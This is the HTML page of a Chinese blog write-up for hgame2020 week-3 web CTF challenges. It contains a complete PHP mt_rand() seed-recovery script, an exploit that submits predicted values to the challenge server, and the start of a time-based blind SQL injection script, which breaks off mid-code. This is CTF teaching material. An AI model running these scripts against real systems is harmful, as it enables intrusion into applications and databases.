@@ -1,0 +1,1045 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xianyu123's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="hgame2020-Level-Week3_Web_writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2020-Level-Week3_Web_writeup">
+<meta property="og:url" content="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/index.html">
+<meta property="og:site_name" content="xianyu123&#39;s Blog">
+<meta property="og:description" content="hgame2020-Level-Week3_Web_writeup">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-02-28T12:21:42.474Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame2020-Level-Week3_Web_writeup">
+<meta name="twitter:description" content="hgame2020-Level-Week3_Web_writeup">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '3WG8LC0SCP',
+      apiKey: 'fd95735b1b343c09b1c7aada663dfa7a',
+      indexName: 'dev_xianyu123',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"没有找到与 ${query} 相关的内容","hits_stats":"搜索到 ${hits} 条相关记录，共耗时 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/">
+
+
+
+
+
+
+  <title>hgame2020-Level-Week3_Web_writeup | xianyu123's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xianyu123's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xianyu123">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xianyu123's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame2020-Level-Week3_Web_writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-04T12:28:22+08:00">
+                2020-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/02/04/hgame2020-Level-Week3-Web-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/02/04/hgame2020-Level-Week3-Web-writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/02/04/hgame2020-Level-Week3-Web-writeup/" class="leancloud_visitors" data-flag-title="hgame2020-Level-Week3_Web_writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>hgame2020-Level-Week3_Web_writeup</p>
+<a id="more"></a>
+<h2 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h2><p>这里具体可以看这篇文章，<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">BREAKING PHP’S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE</a>，原理很不错，值得研究。</p>
+<p>把下面两个文件放在同一目录下</p>
+<p><code>reverse_mt_rand.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.6</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="keyword">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure>
+<p><code>exp.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from reverse_mt_rand import main</span><br><span class="line">url = &apos;https://twoshot.hgame.n3ko.co&apos;</span><br><span class="line">r = requests.Session()</span><br><span class="line">random_num = r.get(url + &apos;/random.php?times=229&apos;).text</span><br><span class="line">random_num = eval(random_num)</span><br><span class="line">first_arg = random_num[0]</span><br><span class="line">second_arg = random_num[227]</span><br><span class="line">third_arg = 0</span><br><span class="line">end_arg = 0</span><br><span class="line">result = main(first_arg,second_arg,third_arg,end_arg)</span><br><span class="line">print(r.post(url=url+&quot;/verify.php&quot;,data=&#123;&quot;ans&quot;: str(result)&#125;).text)</span><br></pre></td></tr></table></figure>
+<p>运行<code>exp.py</code>即可得到flag</p>
+<h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>这里是比较简单的延时盲注，几乎没有任何过滤，用二分法即可跑出来，脚本如下</p>
+<p><code>exp.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id='</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=q80egc37cuo61j1ftstcc25ej9'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_message</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://139.199.182.61:19999/index.php?method=send'</span></span><br><span class="line">    html = requests.post(url=url, data=&#123;<span class="string">'message'</span>: <span class="string">'1'</span>&#125;, headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> max(re.findall(<span class="string">r"&lt;a href=.+method=delete&amp;delete_id=(.+)'&gt;"</span>,html))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            